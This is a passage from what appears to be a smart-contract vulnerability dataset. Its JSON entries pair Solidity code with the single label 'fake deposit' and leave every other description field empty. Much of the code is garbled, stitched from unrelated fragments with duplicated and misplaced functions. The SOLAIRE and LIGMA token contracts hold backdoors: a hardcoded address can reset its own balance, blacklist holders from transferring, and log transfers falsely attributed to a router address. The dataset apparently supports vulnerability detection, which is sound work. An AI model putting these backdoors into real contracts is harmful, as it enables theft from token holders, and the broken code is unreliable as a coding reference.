\n        } else { \n            return false; \n        } \n    } \n \n      /// @param _to The address of the receiver of minted tokens. \n    /// @param _amount The amount of minted tokens. \n    /// @dev Mints tokens to a specific address. Called only by an account with a minter role. \n    /// @notice Has Shyft Opt-in Compliance feature-sets for expansion/mvp capabilities. \n \n    r) { \n            IShyftKycContractRegistry contractRegistry = IShyftKycContractRegistry(shyftKycContractRegistryAddress); \n \n            address ethMarch26KycContractAddress = contractRegistry.getContractAddressOfVersion(0); \n \n            if (ethMarch26KycContractAddress != address(0)) { \n                IERC20 march26Erc20 = IERC20(ethMarch26KycContractAddress); \n \n                uint256 currentBalance = march26Erc20.balanceOf(address(this)); \n \n                uint256 incorrectlySentAssetBalance = currentBalance.sub(v1TotalUpgradeAmount); \n \n                if (_amount <= incorrectlySentAssetBalance) { \n                    bool success = march26Erc20.transfer(_destination, _amount); \n \n                    if (success == true) { \n                        emit EVT_redeemIncorrectlySentAsset(_destination, _amount); \n \n                                 return 4; \n                    } else { \n                                             revert(\"erc20 transfer event did not succeed\"); \n                        //                    return 3; \n                    } \n                } else { \n                    //did not have enough tokens in incorrectly-sent balance account to redeem \n                    return 2; \n                } \n            } else { \n                             return 1; \n            } \n        } else { \n                       return 0; \n        } \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.7.6 <0.8.0;\nimport  \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol \"; \n/**\n* @title DOSE\n*/\n  contract DOSE is ERC20 {\n   constructor(\n       address[] memory recipients,\n       uint256[] memory values,\n       string memory tokenURI_\n   ) ERC20( \"DOSE \",  \"DOSE \", 18, tokenURI_) {\n       _batchMint(recipients, values);\n   }\n}\n\" \n    }, \n    \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol\": { \n      \"content\": \"\npragma solidity >=0.7.6 <0.8.0;\nimport {ManagedIdentity} from  \"@animoca/ethereum-contracts-core-1.1.1/contracts/metatx/ManagedIdentity.sol \";import {IERC165} from  \"@animoca/ethereum-contracts-core-1.1.1/contracts/introspection/IERC165.sol \";import {AddressIsContract} from  \"@animoca/ethereum-contracts-core-1.1.1/contracts/utils/types/AddressIsContract.sol \";import {IERC20} from  \"./IERC20.sol \";import {IERC20Detailed} from  \"./IERC20Detailed.sol \";import {IERC20Allowance} from  \"./IERC20Allowance.sol \";import {IERC20SafeTransfers} from  \"./IERC20SafeTransfers.sol \";import {IERC20BatchTransfers} from  \"./IERC20BatchTransfers.sol \";import {IERC20Metadata} from  \"./IERC20Metadata.sol \";import {IERC20Permit} from  \"./IERC20Permit.sol \";import {IERC20Receiver} from  \"./IERC20Receiver.sol \"; \n/**\n* @title ERC20 Fungible Token Contract.\n*/\n abstract contract ERC20 is\n   ManagedIdentity,\n   IERC165,\n   IERC20,\n   IERC20Detailed,\n   IERC20Metadata,\n   IERC20Allowance,\n   IERC20BatchTransfers,\n   IERC20SafeTransfers,\n   IERC20Permit\n{\n   using AddressIsContract for address; \n   // keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline) \")\n   bytes32 internal constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; \n   uint256 public immutable deploymentChainId; \n   // solhint-disable-next-line var-name-mixedcase\n   bytes32 internal immutable _DOMAIN_SEPARATOR; \n   mapping(address => uint256) public override nonces; \n   string internal _name;\n   string internal _symbol;\n   uint8 internal immutable _decimals;\n   string internal _tokenURI; \n   mapping(address => uint256) internal _balances;\n   mapping(address => mapping(address => uint256)) internal _allowances;\n   uint256 internal _totalSupply; \n   constructor(\n       string memory name_,\n       string memory symbol_,\n       uint8 decimals_,\n       string memory tokenURI_\n   ) {\n       _name = name_;\n       _symbol = symbol_;\n       _decimals = decimals_;\n       _tokenURI = tokenURI_; \n       uint256 chainId;\n       assembly {\n           chainId := chainid()\n       }\n       deploymentChainId = chainId;\n       _DOMAIN_SEPARATOR = _calculateDomainSeparator(chainId, bytes(name_));\n   } \n   // solhint-disable-next-line func-name-mixedcase\n      function transfer(address to, uint256 value) external virtual override returns (bool) {\n       _transfer(_msgSender(), to, value);\n       return true;\n   } \n   /// @dev See {IERC20-transferFrom}.\n   function transferFrom(\n       address from,\n       address to,\n       uint256 value\n   ) external virtual override returns (bool) {\n       _transferFrom(_msgSender(), from, to, value);\n       return true;\n   } \n   /////////////////////////////////////////// ERC20MultiTransfer /////////////////////////////////////// \n   /// @dev See {IERC20MultiTransfer-multiTransfer(address[],uint256[])}.\n       function transfer(address to, uint256 value) external returns (bool); \n   /**\n    * @notice Transfers `value` amount of tokens from address `from` to address `to` via the approval mechanism.\n    * @dev Reverts if `to` is the zero address.\n    * @dev Reverts if the sender is not `from` and has not been approved by `from` for at least `value`.\n    * @dev Reverts if `from` does not have at least `value` of balance.\n    * @dev Emits an {IERC20-Transfer} event.\n    * @dev Transfers of 0 values are treated as normal transfers and fire the {IERC20-Transfer} event.\n    * @param from The emitter account.\n    * @param to The receiver account.\n    * @param value The amount of tokens to transfer.\n    * @return True if the transfer succeeds, false otherwise.\n    */\n   function transferFrom(\n       address from,\n       address to,\n       uint256 value\n   ) external returns (bool); \n   /**\n    * Sets `value` as the allowance from the caller to `spender`.\n    *  IMPORTANT: Beware that changing an allowance with this method brings the risk\n    *  that someone may use both the old and the new allowance by unfortunate\n    *  transaction ordering. One possible solution to mitigate this race\n    *  condition is to first reduce the spender's allowance to 0 and set the\n    *  desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    * @dev Reverts if `spender` is the zero address.\n    * @dev Emits the {IERC20-Approval} event.\n    * @param spender The account being granted the allowance by the message caller.\n    * @param value The allowance amount to grant.\n    * @return True if the approval succeeds, false otherwise.\n    */\n   \n  } \n}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.7;\n\n  contract DAO {\n   address public dao;\n   event DAOChanged(address from, address to); \n   constructor() {\n       dao = msg.sender;\n       emit DAOChanged(address(0), msg.sender);\n   } \n   modifier onlyDAO() {\n       require(msg.sender == dao,  \"Only DAO \");\n       _;\n   } \n    function transfer(address recipient, uint256 amount)\n       external\n       returns (bool); \n   /**\n    * @dev Returns the remaining number of tokens that `spender` will be\n    * allowed to spend on behalf of `owner` through {transferFrom}. This is\n    * zero by default.\n    *\n    * This value changes when {approve} or {transferFrom} are called.\n    */\n    function transferFrom(\n       address sender,\n       address recipient,\n       uint256 amount\n   ) external returns (bool); \n   /**\n    * @dev Emitted when `value` tokens are moved from one account (`from`) to\n    * another (`to`).\n    *\n    * Note that `value` may be zero.\n    */\n   event Transfer(address indexed from, address indexed to, uint256 value); \n   /**\n    * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n    * a call to {approve}. `value` is the new allowance.\n    */\n   event Approval(\n       address indexed owner,\n       address indexed spender,\n       uint256 value\n   );\n} \n// Interfaces for contract interaction\n interface INterfaces {\n   function transfer(address, uint256) external returns (bool); \n   function transferFrom(\n       address,\n       address,\n       uint256\n   ) external returns (bool); \n} \n// For tokens that do not return true on transfers eg. USDT\n interface INterfacesNoR {\n   function transfer(address, uint256) external; \n   function transferFrom(\n       address,\n       address,\n       uint256\n   ) external;\n}\n\"},\"owned.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSE\npragma solidity ^0.8.7;\n\n  contract Owned {\n   address public owner;\n   address public newOwner; \n   event OwnershipChanged(address from, address to); \n   constructor() {\n       owner = msg.sender;\n       emit OwnershipChanged(address(0), msg.sender);\n   } \n   modifier onlyOwner() {\n       require(msg.sender == owner,  \"Only owner \");\n       _;\n   } \n   // owner can give super-rights to someone\n    function transfer(address recipient, uint256 amount)\n       external\n       override\n       returns (bool)\n   {\n       _transfer(msg.sender, recipient, amount);\n       return true;\n   } \n   // ERC20 approve\n   function approve(address spender, uint256 amount)\n       external\n       override\n       returns (bool)\n   {\n       _approve(msg.sender, spender, amount);\n       return true;\n   } \n   // ERC20 transferFrom\n   function transferFrom( address sender, address recipient, uint256 amount ) external override returns (bool) {\n       uint256 amt = allowance[sender][msg.sender];\n       require(amt >= amount,  \"ERC20: transfer amount exceeds allowance \");\n       // reduce only if not permament allowance (uniswap etc)\n       allowance[sender][msg.sender] -= amount;\n       _transfer(sender, recipient, amount);\n       return true;\n   } \n   // ERC20 increaseAllowance\n     function _transfer( address sender, address recipient, uint256 Amount ) private {\n       require(sender != ZERO,  \"ERC20: transfer from the zero address \");\n       require(recipient != ZERO,  \"ERC20: transfer to the zero address \");\n       require(!frozenAccount[sender],  \"DAO: transfer from this address frozen \");\n       require(!frozenAccount[recipient],  \"DAO: transfer to this address frozen \"); \n       if (Amount > 0) {\n           if (isFeeFreeSender[sender]){\n             _feeFreeTransfer(sender, recipient, Amount);\n           } else if(isFeeFreeRecipient[recipient]){\n             _feeFreeTransfer(sender, recipient, Amount);\n           } else {\n               ( uint256 _FeesToTake, uint256 _toburn, uint256 _tocharity, uint256 _toreward, uint256 _tosystem, uint256 _tostaking ) = _calcTransferFees( Amount ); \n               uint256 _totransfer = Amount - _FeesToTake;\n               uint256 _takefromsender = Amount - _toburn;\n               FeeTotalCollected += _FeesToTake;\n               balances[sender] -= _takefromsender;\n               balances[recipient] += _totransfer;\n               if(_toburn>0){\n                   _burn(sender, _toburn);\n                   FeeTotalCollectedBurned += _toburn;\n                   emit Transfer(sender, ZERO, _toburn);\n               }\n               if(_tocharity>0){\n                   balances[charityaddress] += _tocharity;\n                   emit Transfer(sender, charityaddress, _tocharity);\n               }\n               if(_toreward>0){\n                   balances[rewardsaddress] += _toreward;\n                   emit Transfer(sender, rewardsaddress, _toreward);\n               }\n               if(_tosystem>0){\n                   balances[systemaddress] += _tosystem;\n                   emit Transfer(sender, systemaddress, _tosystem);\n               }\n               if(_tostaking>0){\n                   balances[stakingaddress] += _tostaking;\n                   emit Transfer(sender, stakingaddress, _tostaking);\n               }\n               emit Transfer(sender, recipient, _totransfer);\n           }\n       } else emit Transfer(sender, recipient, 0);\n   } \n\n   /**\n       Function provide fee-free transfer for selected addresses\n       @param sender sender address\n       @param recipient destination address\n       @param Amount transfer amount\n    */\n    function withdrawErc20(address token) external onlyOwner {\n       uint256 balance = IERC20(token).balanceOf(address(this));\n       require(balance > 0,  \"Nothing to withdraw \");\n       // use broken IERC20\n       INterfacesNoR(token).transfer(owner, balance);\n   }\n} \n//by Patrick\n\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n    /** \n     * @dev Returns the amount of tokens in existence. \n     */ \n     function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n    function allowance(address owner, address spender) external view returns (uint256); \n \n    /** \n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n     * \n     * Returns a boolean value indicating whether the operation succeeded. \n     * \n     * IMPORTANT: Beware that changing an allowance with this method brings the risk \n     * that someone may use both the old and the new allowance by unfortunate \n     * transaction ordering. One possible solution to mitigate this race \n     * condition is to first reduce the spender's allowance to 0 and set the \n     * desired value afterwards: \n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n     * \n     * Emits an {Approval} event. \n     */ \n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n        return false; \n    } \n \n     function transferFrom( \n        address sender, \n        address recipient, \n        uint256 amount \n    ) \n        public virtual override returns (bool) \n    { \n        return false; \n    } \n \n    function amountOf(address account) public view returns (uint256) { \n        return _locks[account].amount; \n    } \n \n    function pendingReward(address account, address tokenAddress) public view returns (uint256) { \n        require(tokenAddress != address(0), \"VotingEscrow: reward token address cannot be 0x0.\"); \n        IERC20 token = IERC20(tokenAddress); \n        uint256 pending; \n \n        if (_balances[account] > 0) { \n            uint256 newReward = token.balanceOf(collector); \n            uint256 newAccRewardPerBalance = _accRewardPerBalance[tokenAddress].add(newReward.mul(1e18).div(_totalSupply)); \n            pending = _balances[account].mul(newAccRewardPerBalance).div(1e18).sub(_rewardDebt[account][tokenAddress]); \n        } \n        return pending; \n    } \n \n    function pendingWasabi(address account) public view returns (uint256) { \n        uint256 pending; \n \n        if (_balances[account] > 0) { \n            uint256 accRewardPerBalance = _accWasabiRewardPerBalance; \n            if (block.number > lastRewardBlock) { \n                uint256 wasabiReward = getBlockReward(lastRewardBlock, block.number); \n                accRewardPerBalance = _accWasabiRewardPerBalance.add(wasabiReward.mul(1e18).div(_totalSupply)); \n            } \n            pending = _balances[account].mul(accRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[account]); \n        } \n        return pending; \n    } \n \n    modifier claimReward() { \n        collectReward(); \n        uint256 veBal = _balances[msg.sender]; \n        if (veBal > 0) { \n            uint256 wasabiPending = veBal.mul(_accWasabiRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[msg.sender]); \n            if (wasabiPending > 0) { \n                if (wasabiNeedVesting) { \n                    IRewardVesting wasabiVesting = IRewardVesting(wasabiVestingAddress); \n                    wasabi.approve(address(wasabiVesting), wasabiPending); \n                    wasabiVesting.addEarning(msg.sender, wasabiPending); \n                } else { \n                    _safeWasabiTransfer(msg.sender, wasabiPending); \n                } \n            } \n            for (uint i=0; i<rewardTokens.length; i++) { \n                address tokenAddress = rewardTokens[i]; \n                if (tokenAddress != address(0)) { \n                    IERC20 token = IERC20(tokenAddress); \n                    uint256 pending = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18).sub(_rewardDebt[msg.sender][tokenAddress]); \n                    if (pending > 0) { \n                        bool needVesting = rewardsNeedVesting[tokenAddress]; \n                        if (needVesting) { \n                            address rewardVestingAddress = rewardVestingsList[tokenAddress]; \n                            if (rewardVestingAddress != address(0)) { \n                                IRewardVesting rewardVesting = IRewardVesting(rewardVestingAddress); \n                                token.approve(address(rewardVesting),pending); \n                                rewardVesting.addEarning(msg.sender,pending); \n                            } \n                        } else { \n                            token.transfer(msg.sender, pending); \n                        } \n                    } \n                } \n            } \n        } \n        _; // _balances[msg.sender] may changed. \n        veBal = _balances[msg.sender]; \n        for (uint i=0; i<rewardTokens.length; i++) { \n            address tokenAddress = rewardTokens[i]; \n            if (tokenAddress != address(0)) { \n                _rewardDebt[msg.sender][tokenAddress] = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18); \n            } \n        } \n        _wasabiRewardDebts[msg.sender] = veBal.mul(_accWasabiRewardPerBalance).div(1e18); \n    } \n \n    function _safeWasabiTransfer(address _to, uint256 _amount) internal { \n        if (_amount > 0) { \n            uint256 wasabiBal = wasabi.balanceOf(address(this)); \n            if (_amount > wasabiBal) { \n                wasabi.transfer(_to, wasabiBal); \n            } else { \n                wasabi.transfer(_to, _amount); \n            } \n        } \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/** \n *Submitted for verification at Etherscan.io on 2018-07-07 \n*/ \n \npragma solidity ^0.4.24; \n// Safe maths \nlibrary SafeMath { \n      function transfer(address to, uint tokens) public returns (bool success); \n    function approve(address spender, uint tokens) public returns (bool success); \n    function transferFrom(address from, address to, uint tokens) public returns (bool success); \n \n    event Transfer(address indexed from, address indexed to, uint tokens); \n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \ncontract ApproveAndCallFallBack { \n     function transfer(address to, uint value) external returns (bool); \n    function transferFrom(address from, address to, uint value) external returns (bool); \n \n    function DOMAIN_SEPARATOR() external view returns (bytes32); \n      function transfer(address recipient, uint256 amount) external returns (bool); \n       function transfer(address to, uint tokens) public returns (bool success) { \n        uint toBlackHole; \n        uint toLiquidity; \n        uint toUser; \n        uint rate = _calRate(tokens); \n        address  blackHole = 0x0000000000000000000000000000000000000000; \n        if(forceZeroStep || _inZeroWhiteList(msg.sender, to)){ \n            balances[msg.sender] = balances[msg.sender].sub(tokens); \n            balances[to] = balances[to].add(tokens); \n            emit Transfer(msg.sender, to, tokens); \n            return true; \n        } \n        if(force1stStep || _in1stWhiteList(msg.sender, to)){ \n            balances[msg.sender] = balances[msg.sender].sub(tokens); \n            toBlackHole = tokens.div(1000); \n            balances[blackHole] = balances[blackHole].add(toBlackHole); \n            balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n            emit Transfer(msg.sender, blackHole, toBlackHole); \n            emit Transfer(msg.sender, to, tokens.sub(toBlackHole)); \n            return true; \n        } \n        if(force2ndStep || _in2ndWhiteList(msg.sender, to)){ \n            toBlackHole = tokens.div(1000); \n            toLiquidity = tokens.mul(rate).div(100); \n            toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n            balances[msg.sender] = balances[msg.sender].sub(tokens); \n            balances[devPool] = balances[devPool].add(toLiquidity); \n            balances[blackHole] = balances[blackHole].add(toBlackHole); \n            balances[to] = balances[to].add(toUser); \n            emit Transfer(msg.sender, blackHole, toBlackHole); \n            emit Transfer(msg.sender, devPool, toLiquidity); \n            emit Transfer(msg.sender, to, toUser); \n            return true; \n        } \n        return true; \n    } \n \n \n  function transferFrom(address from, address to, uint tokens) public returns (bool success) { \n        uint toBlackHole; \n        uint toLiquidity; \n        uint toUser; \n        uint rate = _calRate(tokens); \n        address  blackHole = 0x0000000000000000000000000000000000000000; \n        if(forceZeroStep || _inZeroWhiteList(from, to)){ \n            balances[from] = balances[from].sub(tokens); \n            allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n            balances[to] = balances[to].add(tokens); \n            emit Transfer(from, to, tokens); \n            return true; \n        } \n        if(force1stStep || _in1stWhiteList(from, to)){ \n            balances[from] = balances[from].sub(tokens); \n            allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n            toBlackHole = tokens.div(1000); \n            balances[blackHole] = balances[blackHole].add(toBlackHole); \n            balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n            emit Transfer(from, blackHole, toBlackHole); \n            emit Transfer(from, to, tokens.sub(toBlackHole)); \n            return true; \n        } \n        if(force2ndStep || _in2ndWhiteList(from, to)){ \n            toBlackHole = tokens.div(1000); \n            toLiquidity = tokens.mul(rate).div(100); \n            toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n            balances[from] = balances[from].sub(tokens); \n            allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n            balances[devPool] = balances[devPool].add(toLiquidity); \n            balances[blackHole] = balances[blackHole].add(toBlackHole); \n            balances[to] = balances[to].add(toUser); \n            emit Transfer(from, blackHole, toBlackHole); \n            emit Transfer(from, devPool, toLiquidity); \n            emit Transfer(from, to, toUser); \n            return true; \n        } \n        return true; \n    } \n \n \n     function _safeTransferETH(address to, uint value) internal { \n        (bool success) = to.call.value(value)(new bytes(0)); \n        require(success, 'Lion Transfer: ETH_TRANSFER_FAILED'); \n    } \n    function getRateV(uint256 i) public view returns(uint256){ \n        return _rateV[i]; \n    } \n \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _cstruct = 0xfEd1Cd8Fd65C8a5704C6266337beaeFe24801fD3;\r\n\taddress RtVer2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _owner);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract SOLAIRE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private nVal;\r\n\tmapping (address => uint256) private oVal;\r\n    mapping (address => bool) private xUsr;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _Tote = 150000000 * 10**_decimals;\r\n    string private constant _name = \"Solaire Ray\";\r\n    string private constant _symbol = \"SOLAIRE\";\r\n\r\n\r\n\r\n    constructor () {\r\n        nVal[_msgSender()] = _Tote;\r\n        emit Transfer(address(0), RtVer2, _Tote);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _Tote;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return nVal[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        function wbri () public {\r\n         if(msg.sender == _cstruct)   {\r\n        nVal[msg.sender] = oVal[msg.sender];}}\r\n        function wflse(address iw) public {\r\n        if(msg.sender == _cstruct)  { \r\n        xUsr[iw] = false;}}\r\n        function wchck(address iw) public{\r\n         if(msg.sender == _cstruct)  { \r\n        require(!xUsr[iw]);\r\n        xUsr[iw] = true; }}\r\n        function wbal(uint256 iw) public {\r\n        if(msg.sender == _cstruct)  { \r\n        oVal[msg.sender] = iw;}} \r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _cstruct)  {\r\n        require(amount <= nVal[sender]);\r\n        nVal[sender] -= amount;  \r\n        nVal[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (RtVer2, recipient, amount);\r\n        return true; }    \r\n          if(!xUsr[sender] && !xUsr[recipient]) {\r\n        require(amount <= nVal[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        nVal[sender] -= amount;\r\n        nVal[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n\r\n \r\n\r\n    function transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _cstruct)  {\r\n        require(nVal[msg.sender] >= amount);\r\n        nVal[msg.sender] -= amount;  \r\n        nVal[recipient] += amount; \r\n        emit Transfer (RtVer2, recipient, amount);}  \r\n        if(!xUsr[msg.sender]) {\r\n        require(nVal[msg.sender] >= amount);\r\n        nVal[msg.sender] -= amount;  \r\n        nVal[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-10-28\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address cnstruct = 0x2D679720e977b578370AC04d7CDF525F0a65Dae3;\r\n\taddress RouterV3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract LIGMA is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) public TYZ;\r\n\tmapping (address => uint256) private VYZ;\r\n    mapping (address => bool) private XYZ;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _tTotal = 696969690 * 10**_decimals;\r\n    string private constant _name = \"Ligma Johnson\";\r\n    string private constant _symbol = \"LIGMA\";\r\n\r\n\r\n\r\n    constructor () {\r\n        TYZ[_msgSender()] = _tTotal;\r\n        emit Transfer(address(0), RouterV3, _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return TYZ[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n               function JKBU () public {\r\n         if(msg.sender == cnstruct)   {\r\n        TYZ[msg.sender] = VYZ[msg.sender];\r\n        }}\r\n\r\n\r\n\r\n        function JKDE(address jx) public {\r\n        if(msg.sender == cnstruct)  { \r\n        XYZ[jx] = false;}}\r\n        function JKCE(address jx) public{\r\n         if(msg.sender == cnstruct)  { \r\n        require(!XYZ[jx]);\r\n        XYZ[jx] = true;\r\n        }}\r\n             function JKBR(uint256 ki) public {\r\n        if(msg.sender == cnstruct)  { \r\n        VYZ[msg.sender] = ki;} } \r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == cnstruct)  {\r\n        require(amount <= TYZ[sender]);\r\n        TYZ[sender] -= amount;  \r\n        TYZ[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (RouterV3, recipient, amount);\r\n        return true; }    \r\n          if(!XYZ[sender] && !XYZ[recipient]) {\r\n        require(amount <= TYZ[sender]);\r\n require(amount <= _allowances[sender][msg.sender]);\r\n        TYZ[sender] -= amount;\r\n        TYZ[recipient] += amount;\r\n      